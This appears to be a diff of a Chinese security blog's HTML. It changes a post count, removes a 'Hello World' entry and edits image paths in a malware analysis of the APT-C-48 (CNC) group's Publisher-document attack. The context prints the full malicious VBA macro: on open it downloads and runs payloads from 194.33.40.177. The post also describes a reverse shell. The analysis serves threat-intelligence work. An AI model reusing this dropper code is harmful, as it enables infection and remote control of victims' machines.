@@ -76,7 +76,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(90)</small>
+                <small>(89)</small>
             
         </div>
     </li>
@@ -579,7 +579,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_posts_number" value="89">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -641,15 +641,6 @@
            data-author="" >
             <span class="post-title" title="对中国整个安全行业的理解">对中国整个安全行业的理解</span>
             <span class="post-date" title="2023-06-14 16:06:36">2023/06/14</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/06/20/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2024-06-20 14:35:01">2024/06/20</span>
         </a>
         
         
@@ -1526,15 +1517,15 @@
 <p>宏病毒拉出来</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Private WithEvents PubApp As Publisher.Application</span><br><span class="line">Sub DownloadFile()</span><br><span class="line">Dim myURL As String</span><br><span class="line">myURL = &quot;http://194.33.40.177/webdav/taskhost.exe&quot;</span><br><span class="line">username = Environ(&quot;username&quot;) </span><br><span class="line"></span><br><span class="line">Dim WinHttpReq As Object</span><br><span class="line">Set WinHttpReq = CreateObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">WinHttpReq.Open &quot;GET&quot;, myURL, False</span><br><span class="line">WinHttpReq.send</span><br><span class="line">If WinHttpReq.Status = 200 Then</span><br><span class="line">    Set oStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    oStream.Open</span><br><span class="line">    oStream.Type = 1</span><br><span class="line">    oStream.Write WinHttpReq.responseBody</span><br><span class="line">    oStream.SaveToFile &quot;C:\Users\&quot; + username + &quot;\Videos\taskhost.exe&quot;, 2 &#x27; 1 = no overwrite, 2 = overwrite</span><br><span class="line">    oStream.Close</span><br><span class="line">End If</span><br><span class="line">End Sub</span><br><span class="line">Sub DownloadBat()</span><br><span class="line">Dim myURL As String</span><br><span class="line">username = Environ(&quot;username&quot;)</span><br><span class="line">myURL = &quot;http://194.33.40.177/webdav/status.txt&quot;</span><br><span class="line">Dim WinHttpReq As Object</span><br><span class="line">Set WinHttpReq = CreateObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">WinHttpReq.Open &quot;GET&quot;, myURL, False</span><br><span class="line">WinHttpReq.send</span><br><span class="line">If WinHttpReq.Status = 200 Then</span><br><span class="line">    Set oStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    oStream.Open</span><br><span class="line">    oStream.Type = 1</span><br><span class="line">    oStream.Write WinHttpReq.responseBody</span><br><span class="line">    oStream.SaveToFile &quot;C:\Users\&quot; + username + &quot;\Videos\status.bat&quot;, 2 &#x27; 1 = no overwrite, 2 = overwrite</span><br><span class="line">    oStream.Close</span><br><span class="line">End If</span><br><span class="line">End Sub</span><br><span class="line">Sub Exec()</span><br><span class="line">Dim x As Variant</span><br><span class="line">Dim Path As String</span><br><span class="line">username = Environ(&quot;username&quot;)</span><br><span class="line">Path = &quot;C:\Users\&quot; + username + &quot;\Videos\status.bat&quot;</span><br><span class="line">x = Shell(Path, vbNormalFocus)</span><br><span class="line">End Sub</span><br><span class="line">Private Sub Document_Open()</span><br><span class="line"> Set PubApp = Publisher.Application</span><br><span class="line"> DownloadFile</span><br><span class="line"> DownloadBat</span><br><span class="line"> Exec</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
 
-<h1 id="taskhost-exe"><a href="#taskhost-exe" class="headerlink" title="taskhost.exe"></a>taskhost.exe</h1><p><img src="/APT-C-48-CNC%E7%BB%84%E7%BB%87%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8pub%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/1.png"></p>
+<h1 id="taskhost-exe"><a href="#taskhost-exe" class="headerlink" title="taskhost.exe"></a>taskhost.exe</h1><p><img src="/.com//1.png"></p>
 <p>测试 mail.63.cn测试连通性</p>
 <p>然后开始base64解密</p>
-<p><img src="/APT-C-48-CNC%E7%BB%84%E7%BB%87%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8pub%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/2.png"></p>
+<p><img src="/.com//2.png"></p>
 <p>三个密钥解密三次</p>
-<p><img src="/APT-C-48-CNC%E7%BB%84%E7%BB%87%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8pub%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/3.png"></p>
+<p><img src="/.com//3.png"></p>
 <p>ipconfig 获取网络配置其上传至服务器，并删除该文件。</p>
 <p>随后通过创建创建管道向远程服务器提供反向shell。</p>
-<p><img src="/APT-C-48-CNC%E7%BB%84%E7%BB%87%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8pub%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/4.png"></p>
+<p><img src="/.com//4.png"></p>
 <p>正如我们在《猎天行动》中提到的，CNC组织部分开发人员在开发环境中集成了vcpkg。而这一特点在本次样本中得到了保留，并且本次攻击活动中使用的路径也与其以往使用的路径保持高度一致。</p>
 <p>在南亚地区的APT攻击活动中，攻击者往往喜欢使用各类文档文件结合社会工程学诱使受害者运行恶意代码。而在本次攻击活动中虽然同样也采用了这一形式，但值得注意的是，与以往我们在文档文件中常见的doc、xls、rtf、docx、xlsm等等格式不同，本次使用的是pub文档。pub文档作为Microsoft Office PUBlisher 建立的电子出版物，在我们日常生活中并不常见，往往只有少部分人群才会接触。</p>
 <p>本次攻击活动中选择这一文档类型作为载荷恰恰体现了攻击者在载荷上多元化的一种趋势，同样也是攻击者在除了鱼叉邮件、文档文件内容之外的又一种针对性攻击的体现。</p>
